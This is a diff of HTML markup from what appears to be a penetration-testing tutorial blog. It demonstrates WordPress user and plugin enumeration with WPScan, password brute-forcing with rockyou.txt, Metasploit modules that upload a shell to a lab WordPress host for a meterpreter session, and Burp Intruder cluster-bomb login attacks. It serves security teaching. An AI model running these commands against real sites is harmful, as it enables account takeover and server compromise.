+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-QxGDfPUPM3s/XwzQVWI6COI/AAAAAAAAlzk/ojf868XBVw8YHlxqFrzEf416c2C7bVGQQCLcBGAsYHQ/s1600/6.png" alt="" data-proportion="true" data-align="none" data-index="5" data-file-name="6.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>After waiting for a few seconds, WPScan will dump our desired result. From the below image, you can see the plugins&nbsp;<strong>&ldquo;mail-masta&rdquo;&nbsp;</strong>and&nbsp;<strong>&ldquo;reflex-gallery&rdquo;</strong>&nbsp;are installed over our target&rsquo;s website. As a bonus, we even get the&nbsp;<strong>last update&nbsp;</strong>and the&nbsp;<strong>latest version</strong>.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-Y8cCXa_Kuyc/XwzQZCbSnxI/AAAAAAAAlzo/HztyQUcKp64-LEbiTSntBglCNCCLbMHFQCLcBGAsYHQ/s1600/7.png" alt="" data-proportion="true" data-align="none" data-index="6" data-file-name="7.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3><strong>Enumerating WordPress Usernames</strong></h3>
+<h3>In order to list out usernames of our target&rsquo;s website privileged users, execute the following command:</h3>
+<h3>wpscan &ndash;url http://192.168.1.105/wordpress/ -e u</h3>
+<h3>The flag&nbsp;<strong>&ldquo;u&rdquo;&nbsp;</strong>&nbsp;will grab all the usernames and will present a list on our screen.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-0p1EhklinrI/XwzQc2ypvnI/AAAAAAAAlzw/UbIyoxfDDMMBQPQwxqoFQjtRfnI30R9FgCLcBGAsYHQ/s1600/8.png" alt="" data-proportion="true" data-align="none" data-index="7" data-file-name="8.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>As WPScan completes its work, we&rsquo;ll find a list of all the users with their user IDs, in accordance with how it grabbed them.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-X2_Om1PXIYY/XwzQhRjYS7I/AAAAAAAAlz4/fu_NeVgia60wr0WMhjlVTThimRqPE-gxACLcBGAsYHQ/s1600/9.png" alt="" data-proportion="true" data-align="none" data-index="8" data-file-name="9.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3><strong>Enumerate ALL with a single command</strong></h3>
+<h3>Does WPScan give us that privilege to scan up the web-applications to check everything in one go, whether it is its version, the installed themes, or the plugins?</h3>
+<h3>Let&rsquo;s check this out!</h3>
+<h3>Fire up the following command to grab everything we scanned above for our target web-application.</h3>
+<h3>wpscan --url http://192.168.1.105/wordpress/ -e at &ndash;e ap &ndash;e u</h3>
+<h3><strong>&ndash;e: at:</strong>&nbsp;enumerate all themes of targeted website</h3>
+<h3><strong>&ndash;e: ap:</strong>&nbsp;enumerate all plugins of targeted website</h3>
+<h3><strong>&ndash;e: u:</strong>&nbsp;enumerate all usernames of targeted website</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-ARQG_Kxo94M/XwzQlJ1CLVI/AAAAAAAAl0E/iceRxitdITgLro7rm1hLDVr8bxKnWG0KQCLcBGAsYHQ/s1600/10.png" alt="" data-proportion="true" data-align="none" data-index="9" data-file-name="10.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3><strong>Brute-force attack using WPScan</strong></h3>
+<h3>With the help of usernames which we enumerated earlier, we can create a&nbsp;<strong>word list</strong>&nbsp;of all the users and can try a brute-force login attack using the default password list as&nbsp;<strong>&ldquo;rockyou.txt&rdquo;</strong>.</h3>
+<h3>From the below image you can see our designed wordlist.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-dlyUUnCoHH4/XwzQojfvSaI/AAAAAAAAl0I/uIZDKhOCTq04TMsfoXRFfBz1UFtW8f62QCLcBGAsYHQ/s1600/11.png" alt="" data-proportion="true" data-align="none" data-index="10" data-file-name="11.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Let&rsquo;s now try to exploit the website by defacing its login credentials using the following command:</h3>
+<h3>wpscan --url http://192.168.1.105/wordpress/ -U user.txt -P /usr/share/wordlists/rockyou.txt</h3>
+<h3>The&nbsp;<strong>&ndash;U&nbsp;</strong>and the&nbsp;<strong>&ndash;P&nbsp;&nbsp;</strong>flags are used to set up the username list and the password list respectively.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-sVNyXb3GGU4/XwzQr27SVOI/AAAAAAAAl0Q/y5GB6PUsZ2Ibv8Gfe3MWF3iP_MCUYXvEwCLcBGAsYHQ/s1600/12.png" alt="" data-proportion="true" data-align="none" data-index="11" data-file-name="12.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>It will start matching the valid combination of username and password and then dumps the result, from the given image you can see we found the login credentials.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-2CxWplZSmbI/XwzQvvEUcRI/AAAAAAAAl0U/umk-CHqPFW4PkL3rnqchuGHseGtBMKvOwCLcBGAsYHQ/s1600/13.png" alt="" data-proportion="true" data-align="none" data-index="12" data-file-name="13.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Great!! We got the&nbsp;<strong>admin&nbsp;</strong>credentials as&nbsp;<strong>&ldquo;admin : jessica&rdquo;.&nbsp;</strong>Let&rsquo;s try to get into the application&rsquo;s dashboard with them.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-bXtHZs1xFpI/XwzQzPdCoOI/AAAAAAAAl0c/zL-fqaQlR0M62j-PP-tkN0hHetFyzBc9QCLcBGAsYHQ/s1600/14.png" alt="" data-proportion="true" data-align="none" data-index="13" data-file-name="14.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3><strong>Shell Upload using Metasploit</strong></h3>
+<h3>Isn&rsquo;t it great if you get the target&rsquo;s shell?</h3>
+<h3>Run the following commands in order to get a meterpreter session of our target&rsquo;s web-application.</h3>
+<h3>msf &gt; use exploit/unix/webapp/wp_admin_shell_upload<br /> msf exploit(wp_admin_shell_upload) &gt; set rhosts 192.168.1.105<br /> msf exploit(wp_admin_shell_upload) &gt; set username admin<br /> msf exploit(wp_admin_shell_upload) &gt; set password jessica<br /> msf exploit(wp_admin_shell_upload) &gt; set targeturi /wordpress<br /> msf exploit(wp_admin_shell_upload) &gt; exploit</h3>
+<h3>This module takes an administrator username and password, logs into the admin panel, and uploads a payload packaged as a WordPress plugin. And finally, give us the meterpreter session of the webserver.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-QVVSz1QS18g/XwzQ232yr6I/AAAAAAAAl0k/DC5ioIqx87QrL0KMDfgvxypCbh3ywOlJQCLcBGAsYHQ/s1600/15.png" alt="" data-proportion="true" data-align="none" data-index="14" data-file-name="15.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3><strong>Vulnerable Plugin Exploitation</strong></h3>
+<h3>Here in our website, we found a vulnerable plugin i.e.&nbsp;<strong>&ldquo;slideshowgallery&rdquo;</strong>&nbsp;which contains an authenticated file upload vulnerability thus in order to exploit it, we will be using the following module which will offer us a reverse shell.</h3>
+<h3>use exploit/unix/webapp/wp_slideshowgallery_upload<br /> msf exploit(wp_slideshowgallery _upload) &gt; set rhost 192.168.1.105<br /> msf exploit(wp_ slideshowgallery _upload) &gt; set targeturi /wordpress<br /> msf exploit(wp_ slideshowgallery _upload) &gt; set username admin<br /> msf exploit(wp_ slideshowgallery _upload) &gt; set password jessica<br /> msf exploit(wp_ slideshowgallery _upload) &gt; exploit</h3>
+<h3>From the below image you can see that we&rsquo;ve successfully captured our target&rsquo;s meterpreter session.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-lAVmnZz6VLs/XwzQ63wrtZI/AAAAAAAAl0o/nwdcVC3cwEwxACz_LjfXWd4q7MMqaEKUQCLcBGAsYHQ/s1600/16.png" alt="" data-proportion="true" data-align="none" data-index="15" data-file-name="16.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3><strong>Scanning over a Proxy Server</strong></h3>
+<h3>Is it possible to scan a WordPress web-application running over a proxy server?</h3>
+<h3>Many web-applications use Proxy servers in order to be secure, but WPScan gives us this advantage to scan such web-applications using the&nbsp;<strong>&ldquo;&ndash;proxy&rdquo;&nbsp;</strong>flag.</h3>
+<h3>Let&rsquo;s check it out how:</h3>
+<h3>Our WordPress web-application is now running over a proxy server with a&nbsp;<strong>&ldquo;port number as 3128&rdquo;.</strong></h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-FHdtggwQhjE/XwzQ-jrJ1NI/AAAAAAAAl0s/bUI5MgcuoVEuwUtx7izTfeIE6j04B1bewCLcBGAsYHQ/s1600/17.png" alt="" data-proportion="true" data-align="none" data-index="16" data-file-name="17.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Now if we try to scan it with the default usage option we&rsquo;ll get an error and our scan will halt. So let&rsquo;s try to use&nbsp;<strong>the proxy port</strong>&nbsp;in order to scan the web-application.</h3>
+<h3>Simply run the following command to&nbsp;<strong>bypass this proxy server</strong>:</h3>
+<h3>wpscan --url http://192.168.1.105/wordpress/ --proxy http://192.168.1.105:3128</h3>
+<h3>From the below image you can see that we are back into the scanning section.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-QSA4bhNGvk4/XwzRCRkJtdI/AAAAAAAAl0w/x4q26YzXom4poSHLPLRLlsdWz2ajfu8bQCLcBGAsYHQ/s1600/18.png" alt="" data-proportion="true" data-align="none" data-index="17" data-file-name="18.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3><strong>Scanning with an HTTP Authentication enabled</strong></h3>
+<h3>Many websites enable HTTP authentication so that they can hide some essential and critical information from unauthenticated users.</h3>
+<h3>We have also set a similar validation over our website with the credentials as&nbsp;<strong>&ldquo;raj : 123&rdquo;.</strong>&nbsp;</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-BpMB_sgO0hI/XwzRH6mpWUI/AAAAAAAAl08/hz8itJSruukCsAK3aj7yiXIZ2MK0o1tRgCLcBGAsYHQ/s1600/19.png" alt="" data-proportion="true" data-align="none" data-index="18" data-file-name="19.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>From the below image you can see that when we tried the normal scan, we got an alert as&nbsp;<strong>&ldquo;Please provide it with &ndash;http-auth&rdquo;.</strong></h3>
+<h3>Thus following this alert, we&rsquo;ve used the&nbsp;<strong>&ndash;http-auth</strong>&nbsp;and had entered our credentials.</h3>
+<h3>wpscan --url http://192.168.1.105/wordpress/ --http-auth raj:123</h3>
+<h3>And there we go, our scan has been started now.</h3>
+<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-69B7UXvQpcw/XwzRL0kcaTI/AAAAAAAAl1E/fZttzpEY_7g6t_glgN94k17Nhrk3Z4yygCLcBGAsYHQ/s1600/20.png" alt="" data-proportion="true" data-align="none" data-index="19" data-file-name="20.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
+</div>
+<h3>&nbsp;</h3>
+<h3>Multiple Ways to Crack WordPress login</h3>
+<h3>In this guide, you will be learning how to compromise a WordPress website&rsquo;s credentials using different brute forcing techniques.</h3>
 <h3><strong>Content</strong></h3>
-
 <ul>
-  <li>Pre-requisites</li>
-  <li>WPscan</li>
-  <li>Metasploit</li>
-  <li>Burp Suite</li>
-  <li>How to avoid a Brute Force Attack?</li>
+<li>
+<h3>Pre-requisites</h3>
+</li>
+<li>
+<h3>WPscan</h3>
+</li>
+<li>
+<h3>Metasploit</h3>
+</li>
+<li>
+<h3>Burp Suite</h3>
+</li>
+<li>
+<h3>How to avoid a Brute Force Attack?</h3>
+</li>
 </ul>
-
 <h3><strong>Pre-requisites:</strong></h3>
-
-<p><strong>Target:</strong>&nbsp;WordPress&nbsp;</p>
-
-<p><strong>Attacker:&nbsp;</strong><strong>Kali Linux (WPscan)</strong></p>
-
-<p>Burp Suite (Intruder)</p>
-
+<h3><strong>Target:</strong>&nbsp;WordPress&nbsp;</h3>
+<h3><strong>Attacker:&nbsp;</strong><strong>Kali Linux (WPscan)</strong></h3>
+<h3>Burp Suite (Intruder)</h3>
 <h3><strong>WPscan</strong></h3>
-
-<p>WPscan is a command-line tool which is used as a black box vulnerability scanner. It is commonly used by security professionals and bloggers to test the security of their website. WPscan comes pre-installed on the most security-based Linux distributions and it is also available as a plug-in.</p>
-
-<p>Here, I am using a WordPress website hosted on localhost as you can see in the image given below</p>
-
+<h3>WPscan is a command-line tool which is used as a black box vulnerability scanner. It is commonly used by security professionals and bloggers to test the security of their website. WPscan comes pre-installed on the most security-based Linux distributions and it is also available as a plug-in.</h3>
+<h3>Here, I am using a WordPress website hosted on localhost as you can see in the image given below</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-xIWU1cSD6G4/XkGQfejuTpI/AAAAAAAAiog/SUXRllxrN1kyM_l5woPJxZUrnW0UDkIVQCLcBGAsYHQ/s1600/1.png" alt="" data-proportion="true" data-align="none" data-index="20" data-file-name="1.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-xIWU1cSD6G4/XkGQfejuTpI/AAAAAAAAiog/SUXRllxrN1kyM_l5woPJxZUrnW0UDkIVQCLcBGAsYHQ/s1600/1.png" alt="" data-proportion="true" data-align="none" data-index="20" data-file-name="1.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>While brute-forcing you can either use your own common username and password lists or the ones provided with Kali Linux. I have used rockyou.txt password file which comes with kali standard installation and contains 14341564 unique passwords.</p>
-
-<pre>
-wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt</pre>
-&nbsp;–URL &nbsp;is URL parameter, followed by URL of the wordpress website to be scanned<br>
-
-<p>-U will only bruteforce the supplied usernames, in our case it is users.txt</p>
-
-<p>-P will bruteforce the passwords from the provided list rockyou.txt</p>
-
-<p>The scan duration mainly depends on how large the password dictionary file is and as we are mapping a large number of users with even larger numbers of passwords it could also impact the performance of the website if left running for a long time.</p>
-
+<h3>&nbsp;</h3>
+<h3>While brute-forcing you can either use your own common username and password lists or the ones provided with Kali Linux. I have used rockyou.txt password file which comes with kali standard installation and contains 14341564 unique passwords.</h3>
+<h3>wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt</h3>
+<h3>&nbsp;&ndash;URL &nbsp;is URL parameter, followed by URL of the wordpress website to be scanned</h3>
+<h3>-U will only bruteforce the supplied usernames, in our case it is users.txt</h3>
+<h3>-P will bruteforce the passwords from the provided list rockyou.txt</h3>
+<h3>The scan duration mainly depends on how large the password dictionary file is and as we are mapping a large number of users with even larger numbers of passwords it could also impact the performance of the website if left running for a long time.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-rPE6TAlqXWs/XkGQfoiAZgI/AAAAAAAAiok/6jIaRVXSlkUTFdmYC73AAHqxAO_PC1SngCLcBGAsYHQ/s1600/2.png" alt="" data-proportion="true" data-align="none" data-index="21" data-file-name="2.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-rPE6TAlqXWs/XkGQfoiAZgI/AAAAAAAAiok/6jIaRVXSlkUTFdmYC73AAHqxAO_PC1SngCLcBGAsYHQ/s1600/2.png" alt="" data-proportion="true" data-align="none" data-index="21" data-file-name="2.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>The screen shows the attack as a success with the username as&nbsp;<strong>admin&nbsp;</strong>and password as<strong>&nbsp;flower</strong>.</p>
-
+<h3>&nbsp;</h3>
+<h3>The screen shows the attack as a success with the username as&nbsp;<strong>admin&nbsp;</strong>and password as<strong>&nbsp;flower</strong>.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-Y1kT9Wa-_EM/XkGQgdX6zoI/AAAAAAAAios/-9fRGnC2KecvswBsUpixDNNA219f9BYiwCLcBGAsYHQ/s1600/3.png" alt="" data-proportion="true" data-align="none" data-index="22" data-file-name="3.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-Y1kT9Wa-_EM/XkGQgdX6zoI/AAAAAAAAios/-9fRGnC2KecvswBsUpixDNNA219f9BYiwCLcBGAsYHQ/s1600/3.png" alt="" data-proportion="true" data-align="none" data-index="22" data-file-name="3.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
+<h3>&nbsp;</h3>
 <h3><strong>Metasploit</strong></h3>
-
-<p>As we know Metasploit comes preinstalled with Kali Linux, so our first step is to get to the Metasploit console and then run WordPress module used below.</p>
-
-<p>This msf module will run a username and password audit. It will first validate usernames and then map passwords with them.&nbsp;<strong>&nbsp;</strong></p>
-
-<pre>
-msf &gt; use auxiliary/scanner/http/wordpress_login_enum<br>
-msf auxiliary(wordpress_login_enum) &gt; set rhosts 192.168.1.100<br>
-msf auxiliary(wordpress_login_enum) &gt; set targeturi /wordpress<br>
-msf auxiliary(wordpress_login_enum) &gt; set user_file user.txt<br>
-msf auxiliary(wordpress_login_enum) &gt; set pass_file pass.txt<br>
-msf auxiliary(wordpress_login_enum) &gt; exploit</pre>
-Yet again successful brute force login with credentials<strong>&nbsp;“Admin&nbsp;</strong>and&nbsp;<strong>flower”</strong>&nbsp;can be seen in the following screenshot.<br>
-
+<h3>As we know Metasploit comes preinstalled with Kali Linux, so our first step is to get to the Metasploit console and then run WordPress module used below.</h3>
+<h3>This msf module will run a username and password audit. It will first validate usernames and then map passwords with them.&nbsp;<strong>&nbsp;</strong></h3>
+<h3>msf &gt; use auxiliary/scanner/http/wordpress_login_enum<br /> msf auxiliary(wordpress_login_enum) &gt; set rhosts 192.168.1.100<br /> msf auxiliary(wordpress_login_enum) &gt; set targeturi /wordpress<br /> msf auxiliary(wordpress_login_enum) &gt; set user_file user.txt<br /> msf auxiliary(wordpress_login_enum) &gt; set pass_file pass.txt<br /> msf auxiliary(wordpress_login_enum) &gt; exploit</h3>
+<h3>Yet again successful brute force login with credentials<strong>&nbsp;&ldquo;Admin&nbsp;</strong>and&nbsp;<strong>flower&rdquo;</strong>&nbsp;can be seen in the following screenshot.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-w1-S9wZ3fLo/XkGQg7V-vAI/AAAAAAAAiow/e_juNg-JSgYrbycT10hMWx4RdLkEPbzcQCLcBGAsYHQ/s1600/4.png" alt="" data-proportion="true" data-align="none" data-index="23" data-file-name="4.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-w1-S9wZ3fLo/XkGQg7V-vAI/AAAAAAAAiow/e_juNg-JSgYrbycT10hMWx4RdLkEPbzcQCLcBGAsYHQ/s1600/4.png" alt="" data-proportion="true" data-align="none" data-index="23" data-file-name="4.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
+<h3>&nbsp;</h3>
 <h3><strong>Burp Suite</strong></h3>
-
-<p>For this install Burp suite community edition or use the one you get pre-installed in Kali Linux. Fire up Burp Suite and open WordPress login page then turn on&nbsp;<strong>intercept tab</strong>&nbsp;in Burp Proxy, next supply any username and password of your choice to login into the wordpress website. This will intercept the response of the current request.</p>
-
+<h3>For this install Burp suite community edition or use the one you get pre-installed in Kali Linux. Fire up Burp Suite and open WordPress login page then turn on&nbsp;<strong>intercept tab</strong>&nbsp;in Burp Proxy, next supply any username and password of your choice to login into the wordpress website. This will intercept the response of the current request.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-mxJTJJKgPcg/XkGQg92ZGDI/AAAAAAAAio0/EopvObYs1bUVovZlI2z4IrbwuKFB2gSOACLcBGAsYHQ/s1600/5.png" alt="" data-proportion="true" data-align="none" data-index="24" data-file-name="5.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-mxJTJJKgPcg/XkGQg92ZGDI/AAAAAAAAio0/EopvObYs1bUVovZlI2z4IrbwuKFB2gSOACLcBGAsYHQ/s1600/5.png" alt="" data-proportion="true" data-align="none" data-index="24" data-file-name="5.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>Look at the image below and notice the last line of the intercepted message, it shows the captured login credentials as&nbsp;<strong>raj:raj</strong>&nbsp;which I used to login as username and password respectively. Next, Send the captured message to the&nbsp;<strong>intruder</strong>&nbsp;by right-clicking the blank message space and choosing to&nbsp;<strong>Send to Intruder&nbsp;</strong>option or by just pressing&nbsp;<strong>ctrl + I.</strong></p>
-
+<h3>&nbsp;</h3>
+<h3>Look at the image below and notice the last line of the intercepted message, it shows the captured login credentials as&nbsp;<strong>raj:raj</strong>&nbsp;which I used to login as username and password respectively. Next, Send the captured message to the&nbsp;<strong>intruder</strong>&nbsp;by right-clicking the blank message space and choosing to&nbsp;<strong>Send to Intruder&nbsp;</strong>option or by just pressing&nbsp;<strong>ctrl + I.</strong></h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-VuM5Wo9Obfg/XkGQhG-qaVI/AAAAAAAAio4/3nUiiZf_-IYjqK5PaODkHQEcS1fHoO5WQCLcBGAsYHQ/s1600/6.png" alt="" data-proportion="true" data-align="none" data-index="25" data-file-name="6.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-VuM5Wo9Obfg/XkGQhG-qaVI/AAAAAAAAio4/3nUiiZf_-IYjqK5PaODkHQEcS1fHoO5WQCLcBGAsYHQ/s1600/6.png" alt="" data-proportion="true" data-align="none" data-index="25" data-file-name="6.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>Now open the&nbsp;<strong>Intruder tab and you can see the base template</strong>&nbsp;request that we sent here. Select&nbsp;<strong>Positions</strong>&nbsp;tab, hereby default multiple positions are selected, these positions are marked using § characters. Anything between two&nbsp;<strong>§</strong>&nbsp;characters is replaced by a payload. But we don’t need them all right now so click on the&nbsp;<strong>clear button</strong>&nbsp;at right bottom corner of the editor window.</p>
-
-<p>Next, select the positions as shown in the screenshot and click on&nbsp;<strong>add button</strong>&nbsp;to the right of the frame. This will configure these two selected positions as payload insertion points. Now to customize the attack select the&nbsp;<strong>attack type</strong>. As we are having 2 payload positions, I am choosing&nbsp;<strong>cluster bomb&nbsp;</strong>(This attack type is useful for a brute-force attack as It puts the first payload in the first position and the second payload in the second position. But when it loops through the payload sets, it tries all combinations. For example, if you have 1000 user names and 1000 passwords, this will perform 1000000 requests.)</p>
-
-<p>Now hit up the&nbsp;<strong>start attack button.</strong></p>
-
+<h3>&nbsp;</h3>
+<h3>Now open the&nbsp;<strong>Intruder tab and you can see the base template</strong>&nbsp;request that we sent here. Select&nbsp;<strong>Positions</strong>&nbsp;tab, hereby default multiple positions are selected, these positions are marked using &sect; characters. Anything between two&nbsp;<strong>&sect;</strong>&nbsp;characters is replaced by a payload. But we don&rsquo;t need them all right now so click on the&nbsp;<strong>clear button</strong>&nbsp;at right bottom corner of the editor window.</h3>
+<h3>Next, select the positions as shown in the screenshot and click on&nbsp;<strong>add button</strong>&nbsp;to the right of the frame. This will configure these two selected positions as payload insertion points. Now to customize the attack select the&nbsp;<strong>attack type</strong>. As we are having 2 payload positions, I am choosing&nbsp;<strong>cluster bomb&nbsp;</strong>(This attack type is useful for a brute-force attack as It puts the first payload in the first position and the second payload in the second position. But when it loops through the payload sets, it tries all combinations. For example, if you have 1000 user names and 1000 passwords, this will perform 1000000 requests.)</h3>
+<h3>Now hit up the&nbsp;<strong>start attack button.</strong></h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-riZmgfalHic/XkGQhq8xNII/AAAAAAAAio8/Qqo3-u1rRccOcyAqNAMdpDrVOUg2bX6-wCLcBGAsYHQ/s1600/7.png" alt="" data-proportion="true" data-align="none" data-index="26" data-file-name="7.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-riZmgfalHic/XkGQhq8xNII/AAAAAAAAio8/Qqo3-u1rRccOcyAqNAMdpDrVOUg2bX6-wCLcBGAsYHQ/s1600/7.png" alt="" data-proportion="true" data-align="none" data-index="26" data-file-name="7.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>In&nbsp;<strong>payloads tab, click</strong>&nbsp;on&nbsp;<strong>payload set&nbsp;</strong>drop-down, here you can see numbers 1 and 2. Select&nbsp;<strong>number 1&nbsp;</strong>for the first payload position. Choose a&nbsp;<strong>simple list</strong>&nbsp;from<strong>&nbsp;payload type,&nbsp;</strong>this list lets you configure a simple list of strings that are used as payloads. you can manually add items to the list using the text box and the&nbsp;<strong>Add</strong>&nbsp;button, or you can paste a list from the clipboard, or&nbsp;<strong>load</strong>&nbsp;from file.</p>
-
+<h3>&nbsp;</h3>
